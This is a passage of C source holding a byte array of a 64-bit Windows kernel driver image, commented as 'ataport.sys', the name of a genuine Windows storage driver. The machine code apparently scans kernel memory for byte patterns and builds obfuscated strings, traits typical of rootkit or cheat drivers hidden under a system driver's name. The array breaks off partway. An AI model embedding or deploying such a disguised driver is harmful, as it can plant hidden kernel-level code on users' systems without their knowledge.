// ??????? ataport.sys
unsigned char Driver_sys[] = {
0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x00, 0x00,
0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x39, 0xA2, 0x3D, 0x86, 0x7D, 0xC3, 0x53, 0xD5, 0x7D, 0xC3, 0x53, 0xD5, 0x7D, 0xC3, 0x53, 0xD5,
0x09, 0x42, 0x54, 0xD4, 0x7E, 0xC3, 0x53, 0xD5, 0x09, 0x42, 0x52, 0xD4, 0x78, 0xC3, 0x53, 0xD5,
0x7D, 0xC3, 0x52, 0xD5, 0x4A, 0xC3, 0x53, 0xD5, 0x09, 0x42, 0x50, 0xD4, 0x79, 0xC3, 0x53, 0xD5,
0x09, 0x42, 0x57, 0xD4, 0x79, 0xC3, 0x53, 0xD5, 0xF2, 0x4A, 0x5A, 0xD4, 0x7C, 0xC3, 0x53, 0xD5,
0xF2, 0x4A, 0x51, 0xD4, 0x7C, 0xC3, 0x53, 0xD5, 0x52, 0x69, 0x63, 0x68, 0x7D, 0xC3, 0x53, 0xD5,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x06, 0x00, 0x01, 0x37, 0xAE, 0x68, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x00, 0x0B, 0x02, 0x0E, 0x2C, 0x00, 0x56, 0x00, 0x00,
0x00, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x98, 0x58, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
0x0A, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0xB0, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0xB7, 0xBD, 0x00, 0x00, 0x01, 0x00, 0x60, 0x01,
0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x90, 0x00, 0x00, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x80, 0x00, 0x00, 0x28, 0x02, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0xE0, 0x10, 0x00, 0x00,
0x00, 0xA0, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x98, 0x66, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x65, 0x00, 0x00, 0x48, 0x01, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x10, 0x01, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00,
0x69, 0x4F, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68,
0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x58, 0x0D, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00,
0x00, 0x0E, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00,
0xA4, 0x07, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x62, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC8,
0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x28, 0x02, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00,
0x00, 0x04, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 0x49, 0x4E, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00,
0x46, 0x04, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x62,
0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00,
0x00, 0x02, 0x00, 0x00, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x7C, 0x24, 0x10, 0x44, 0x0F, 0xB7, 0x01, 0x48, 0x8B,
0xD9, 0x41, 0xF6, 0xC0, 0x01, 0x0F, 0x85, 0xE0, 0x00, 0x00, 0x00, 0x0F, 0xB7, 0x41, 0x02, 0xA8,
0x01, 0x0F, 0x85, 0xD4, 0x00, 0x00, 0x00, 0x66, 0x44, 0x3B, 0xC0, 0x0F, 0x87, 0xCA, 0x00, 0x00,
0x00, 0xBF, 0xFE, 0xFF, 0x00, 0x00, 0x66, 0x3B, 0xC7, 0x0F, 0x87, 0xBC, 0x00, 0x00, 0x00, 0x4C,
0x8B, 0x51, 0x08, 0x4D, 0x85, 0xD2, 0x75, 0x13, 0x66, 0x45, 0x85, 0xC0, 0x0F, 0x85, 0xA9, 0x00,
0x00, 0x00, 0x66, 0x85, 0xC0, 0x0F, 0x85, 0xA0, 0x00, 0x00, 0x00, 0x0F, 0xB7, 0x0A, 0x4C, 0x8B,
0xC8, 0x49, 0xD1, 0xE9, 0x45, 0x33, 0xDB, 0xF6, 0xC1, 0x01, 0x75, 0x75, 0x0F, 0xB7, 0x42, 0x02,
0xA8, 0x01, 0x75, 0x6D, 0x66, 0x3B, 0xC8, 0x77, 0x68, 0x66, 0x3B, 0xC7, 0x77, 0x63, 0x4C, 0x8B,
0x42, 0x08, 0x4D, 0x85, 0xC0, 0x75, 0x0A, 0x66, 0x85, 0xC9, 0x75, 0x55, 0x66, 0x85, 0xC0, 0x75,
0x50, 0x48, 0x8B, 0xD1, 0x41, 0x8B, 0xCB, 0x48, 0xD1, 0xEA, 0x4D, 0x85, 0xC9, 0x74, 0x22, 0x90,
0x48, 0x85, 0xD2, 0x74, 0x41, 0x41, 0x0F, 0xB7, 0x00, 0x48, 0xFF, 0xCA, 0x66, 0x41, 0x89, 0x02,
0x49, 0x83, 0xC0, 0x02, 0x49, 0x83, 0xC2, 0x02, 0x49, 0xFF, 0xC3, 0x49, 0x83, 0xE9, 0x01, 0x75,
0xDF, 0x48, 0x85, 0xD2, 0xB8, 0x05, 0x00, 0x00, 0x80, 0x0F, 0x45, 0xC8, 0x66, 0x45, 0x03, 0xDB,
0x66, 0x44, 0x89, 0x1B, 0x8B, 0xC1, 0x48, 0x8B, 0x5C, 0x24, 0x08, 0x48, 0x8B, 0x7C, 0x24, 0x10,
0xC3, 0xB9, 0x0D, 0x00, 0x00, 0xC0, 0x66, 0x45, 0x03, 0xDB, 0x8B, 0xC1, 0x66, 0x44, 0x89, 0x1B,
0x48, 0x8B, 0x5C, 0x24, 0x08, 0x48, 0x8B, 0x7C, 0x24, 0x10, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x08,
0xB8, 0x0D, 0x00, 0x00, 0xC0, 0x48, 0x8B, 0x7C, 0x24, 0x10, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0x05, 0x89, 0x64, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x74, 0x5C, 0xB8, 0x01, 0x00, 0x00,
0x00, 0x0F, 0x1F, 0x40, 0x00, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
0x8D, 0x48, 0xFF, 0x44, 0x8B, 0xC8, 0x42, 0x0F, 0xB6, 0x14, 0x01, 0x44, 0x8B, 0xD1, 0x8B, 0xC8,
0x80, 0xFA, 0x8B, 0x75, 0x15, 0x42, 0x80, 0x3C, 0x01, 0x81, 0x75, 0x24, 0x43, 0x8B, 0x44, 0x02,
0x02, 0x89, 0x05, 0x55, 0x64, 0x00, 0x00, 0xB0, 0x01, 0xC3, 0x80, 0xFA, 0x48, 0x75, 0x11, 0x42,
0x80, 0x3C, 0x01, 0x8B, 0x75, 0x0A, 0x8D, 0x48, 0x01, 0x42, 0x80, 0x3C, 0x01, 0x81, 0x74, 0x0B,
0xFF, 0xC0, 0x41, 0x83, 0xF9, 0x40, 0x72, 0xB8, 0x32, 0xC0, 0xC3, 0x43, 0x8B, 0x44, 0x02, 0x03,
0x89, 0x05, 0x26, 0x64, 0x00, 0x00, 0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0x05, 0xF1, 0x63, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x74, 0x28, 0x33, 0xC0, 0x66, 0x90,
0x42, 0x80, 0x3C, 0x00, 0x48, 0x75, 0x16, 0x44, 0x8D, 0x48, 0x02, 0x41, 0x8D, 0x49, 0xFF, 0x42,
0x80, 0x3C, 0x01, 0x8D, 0x75, 0x07, 0x43, 0x80, 0x3C, 0x01, 0x81, 0x74, 0x0A, 0xFF, 0xC0, 0x83,
0xF8, 0x40, 0x72, 0xDC, 0x32, 0xC0, 0xC3, 0x42, 0x8B, 0x44, 0x00, 0x03, 0x89, 0x05, 0xDE, 0x63,
0x00, 0x00, 0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x40, 0x53, 0x56, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x83, 0x3D, 0xBD, 0x63, 0x00, 0x00, 0x00, 0x0F,
0x84, 0x83, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x5C, 0x4E, 0x00, 0x00, 0x48, 0x8B, 0x30, 0x48,
0x89, 0x74, 0x24, 0x48, 0x33, 0xDB, 0x89, 0x5C, 0x24, 0x40, 0x81, 0xFB, 0x00, 0x08, 0x00, 0x00,
0x73, 0x66, 0x3B, 0x1D, 0x94, 0x63, 0x00, 0x00, 0x74, 0x59, 0x8B, 0xD3, 0x48, 0x8D, 0x0C, 0x33,
0x48, 0x8B, 0x39, 0x48, 0x39, 0x4F, 0x08, 0x75, 0x3F, 0x48, 0x8B, 0x41, 0x08, 0x48, 0x39, 0x08,
0x75, 0x36, 0x48, 0x2B, 0xFA, 0x48, 0x3B, 0xFE, 0x74, 0x2C, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xA5,
0x4E, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x1F, 0x8B, 0x05, 0x5F, 0x63, 0x00, 0x00, 0x48, 0x8B, 0x0C,
0x38, 0x48, 0x89, 0x4C, 0x24, 0x50, 0x85, 0xC9, 0x74, 0x0A, 0x89, 0x1D, 0x48, 0x63, 0x00, 0x00,
0xB0, 0x01, 0xEB, 0x16, 0xEB, 0x0D, 0xEB, 0x0B, 0xEB, 0x09, 0x48, 0x8B, 0x74, 0x24, 0x48, 0x8B,
0x5C, 0x24, 0x40, 0x83, 0xC3, 0x08, 0xEB, 0x8E, 0x32, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0x5E,
0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x48, 0x89, 0x5C, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x33,
0xDB, 0x8B, 0xF3, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0x05, 0xA9, 0x4D, 0x00, 0x00, 0x48,
0x8B, 0x38, 0x48, 0x8B, 0x05, 0xCF, 0x62, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xFF, 0xD0, 0x48, 0x8B,
0xC8, 0x48, 0x8D, 0x15, 0x78, 0x4B, 0x00, 0x00, 0xFF, 0x15, 0xBA, 0x4D, 0x00, 0x00, 0x85, 0xC0,
0x74, 0x1B, 0x8B, 0x05, 0xD0, 0x62, 0x00, 0x00, 0x48, 0x8B, 0x3C, 0x38, 0x48, 0x2B, 0xF8, 0x48,
0x8B, 0x05, 0x72, 0x4D, 0x00, 0x00, 0x48, 0x3B, 0x38, 0x75, 0xC7, 0xEB, 0x08, 0x48, 0x8B, 0xF7,
0x48, 0x89, 0x7C, 0x24, 0x20, 0xEB, 0x07, 0x33, 0xDB, 0x48, 0x8B, 0x74, 0x24, 0x20, 0x48, 0x85,
0xF6, 0x74, 0x4C, 0x48, 0x8B, 0x05, 0x56, 0x62, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0xFF, 0xD0, 0x48,
0x8B, 0xC8, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x85, 0xC0, 0x74, 0x33, 0x89, 0x5C, 0x24, 0x40,
0x81, 0xFB, 0x00, 0x10, 0x00, 0x00, 0x73, 0x27, 0x8B, 0xC3, 0x48, 0x39, 0x0C, 0x30, 0x75, 0x0A,
0x89, 0x1D, 0x12, 0x63, 0x00, 0x00, 0xB0, 0x01, 0xEB, 0x17, 0xEB, 0x0E, 0x48, 0x8B, 0x74, 0x24,
0x20, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x83, 0xC3, 0x08, 0xEB, 0xCD, 0x32,
0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x8B, 0x74, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30, 0x5F,
0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0xC1, 0x48, 0x85, 0xC9, 0x75, 0x03, 0x33, 0xC0, 0xC3, 0x48, 0x8B, 0x05, 0xD6, 0x4C,
0x00, 0x00, 0x4C, 0x8B, 0x08, 0x49, 0x8B, 0xD1, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
0x8B, 0x0D, 0x16, 0x62, 0x00, 0x00, 0x4C, 0x39, 0x04, 0x11, 0x75, 0x05, 0x48, 0x8B, 0xC2, 0xEB,
0x16, 0x8B, 0x05, 0x01, 0x62, 0x00, 0x00, 0x48, 0x8B, 0x14, 0x10, 0x48, 0x2B, 0xD0, 0x49, 0x3B,
0xD1, 0x75, 0xDD, 0xEB, 0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48,
0x8B, 0xF1, 0x48, 0x85, 0xC9, 0x75, 0x12, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B,
0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8B, 0x05, 0x68, 0x4C, 0x00, 0x00,
0x48, 0x8B, 0x38, 0x48, 0x8B, 0xDF, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
0x8B, 0x0D, 0xAA, 0x61, 0x00, 0x00, 0x48, 0x03, 0xCB, 0x48, 0x8B, 0xD6, 0xFF, 0x15, 0x76, 0x4C,
0x00, 0x00, 0x85, 0xC0, 0x75, 0x0B, 0x8B, 0x05, 0x90, 0x61, 0x00, 0x00, 0x8B, 0x04, 0x18, 0xEB,
0x16, 0x8B, 0x05, 0x81, 0x61, 0x00, 0x00, 0x48, 0x8B, 0x1C, 0x18, 0x48, 0x2B, 0xD8, 0x48, 0x3B,
0xDF, 0x75, 0xCD, 0xEB, 0xA2, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24,
0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x48, 0x89, 0x5C, 0x24, 0x18, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
0x48, 0x8D, 0x6C, 0x24, 0xD9, 0x48, 0x81, 0xEC, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xDD,
0x4B, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x6B, 0x48, 0x89, 0x05, 0x8A, 0x61, 0x00, 0x00, 0x48, 0x8D,
0x4D, 0xFF, 0x48, 0x8B, 0x05, 0xF7, 0x4B, 0x00, 0x00, 0x45, 0x33, 0xED, 0x48, 0x89, 0x05, 0x2D,
0x61, 0x00, 0x00, 0xC7, 0x45, 0x67, 0xDC, 0x00, 0xEE, 0x00, 0xC7, 0x45, 0x6B, 0x31, 0x00, 0x00,
0x00, 0xFF, 0x15, 0xA9, 0x4B, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x5A, 0x61, 0x00, 0x00, 0x48, 0x8D,
0x55, 0x73, 0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x45, 0x6F, 0xDF, 0x00, 0xEE, 0x00, 0xC7, 0x45, 0x73,
0x32, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0x3B, 0x61, 0x00, 0x00, 0x48, 0x8D, 0x55,
0x6B, 0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x45, 0x67, 0xDE, 0x00, 0xEE, 0x00, 0xC7, 0x45, 0x6B, 0x33,
0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0x1C, 0x61, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x73,
0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x45, 0x6F, 0xD9, 0x00, 0xEE, 0x00, 0xC7, 0x45, 0x73, 0x34, 0x00,
0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xFD, 0x60, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x6B, 0x48,
0x8D, 0x4D, 0xFF, 0xC7, 0x45, 0x67, 0xD8, 0x00, 0xEE, 0x00, 0xC7, 0x45, 0x6B, 0x35, 0x00, 0x00,
0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xDE, 0x60, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x73, 0x48, 0x8D,
0x4D, 0xFF, 0xC7, 0x45, 0x6F, 0xDB, 0x00, 0xEE, 0x00, 0xC7, 0x45, 0x73, 0x36, 0x00, 0x00, 0x00,
0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xBF, 0x60, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x6B, 0x48, 0x8D, 0x4D,
0xFF, 0xC7, 0x45, 0x67, 0xDA, 0x00, 0xEE, 0x00, 0xC7, 0x45, 0x6B, 0x37, 0x00, 0x00, 0x00, 0xFF,
0xD0, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xC7, 0x44, 0x24, 0x20, 0xBF, 0x00, 0x9A, 0x00, 0xC7, 0x44,
0x24, 0x24, 0x83, 0x00, 0xB9, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x9F, 0x00, 0x9B, 0x00, 0xC7, 0x45,
0x83, 0x87, 0x00, 0xB5, 0x00, 0xC7, 0x45, 0x87, 0x9B, 0x00, 0x85, 0x00, 0xC7, 0x45, 0x8B, 0x9E,
0x00, 0xAB, 0x00, 0xC7, 0x45, 0x8F, 0x8D, 0x00, 0x88, 0x00, 0xC7, 0x45, 0x93, 0x92, 0x00, 0x92,
0x00, 0x48, 0xC7, 0x45, 0x97, 0x9A, 0x00, 0xFE, 0x00, 0x4C, 0x89, 0x6D, 0x9F, 0x4C, 0x89, 0x6D,
0xA7, 0x4C, 0x89, 0x6D, 0xAF, 0x4C, 0x89, 0x6D, 0xB7, 0xE8, 0x42, 0x40, 0x00, 0x00, 0x48, 0x8B,
0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x3D, 0x60, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xEE, 0x5F,
0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05, 0x61, 0x5F, 0x00, 0x00, 0xC7,
0x44, 0x24, 0x20, 0xBF, 0x00, 0x9A, 0x00, 0xC7, 0x44, 0x24, 0x24, 0x83, 0x00, 0xB1, 0x00, 0xC7,
0x44, 0x24, 0x28, 0x9F, 0x00, 0x81, 0x00, 0xC7, 0x45, 0x83, 0x9A, 0x00, 0xA7, 0x00, 0xC7, 0x45,
0x87, 0x81, 0x00, 0x84, 0x00, 0xC7, 0x45, 0x8B, 0x9E, 0x00, 0x96, 0x00, 0xC7, 0x45, 0x8F, 0x9E,
0x00, 0xAE, 0x00, 0xC7, 0x45, 0x93, 0x94, 0x00, 0xA9, 0x00, 0xC7, 0x45, 0x97, 0x93, 0x00, 0x97,
0x00, 0xC7, 0x45, 0x9B, 0x9C, 0x00, 0x6F, 0x01, 0xC7, 0x45, 0x9F, 0x65, 0x01, 0x67, 0x01, 0xC7,
0x45, 0xA3, 0x50, 0x01, 0x70, 0x01, 0xC7, 0x45, 0xA7, 0x77, 0x01, 0x6F, 0x01, 0x33, 0xC0, 0xC7,
0x45, 0xAB, 0x69, 0x01, 0x6F, 0x01, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x45, 0xB7, 0x48,
0x89, 0x45, 0xBF, 0x48, 0x89, 0x45, 0xC7, 0x48, 0x89, 0x45, 0xCF, 0x48, 0x89, 0x45, 0xD7, 0x48,
0x89, 0x45, 0xDF, 0x89, 0x45, 0xE7, 0x48, 0xC7, 0x45, 0xAF, 0x09, 0x01, 0x00, 0x00, 0xE8, 0xFD,
0x3D, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x88, 0x5F, 0x00, 0x00,
0x48, 0x8B, 0x05, 0x39, 0x5F, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05,
0x24, 0x5F, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x33, 0xC0, 0xC7, 0x44, 0x24, 0x20, 0xBF,
0x00, 0x9A, 0x00, 0x48, 0x89, 0x45, 0xAB, 0x48, 0x89, 0x45, 0xB3, 0x48, 0x89, 0x45, 0xBB, 0x48,
0x89, 0x45, 0xC3, 0x48, 0x89, 0x45, 0xCB, 0xC7, 0x44, 0x24, 0x24, 0x83, 0x00, 0xA3, 0x00, 0xC7,
0x44, 0x24, 0x28, 0x84, 0x00, 0x94, 0x00, 0xC7, 0x45, 0x83, 0x95, 0x00, 0x9D, 0x00, 0xC7, 0x45,
0x87, 0x8D, 0x00, 0xA3, 0x00, 0xC7, 0x45, 0x8B, 0x99, 0x00, 0x91, 0x00, 0xC7, 0x45, 0x8F, 0x9A,
0x00, 0x95, 0x00, 0xC7, 0x45, 0x93, 0x9F, 0x00, 0x99, 0x00, 0xC7, 0x45, 0x97, 0xAE, 0x00, 0x8A,
0x00, 0xC7, 0x45, 0x9B, 0x8D, 0x00, 0x69, 0x01, 0xC7, 0x45, 0x9F, 0x6F, 0x01, 0x65, 0x01, 0x48,
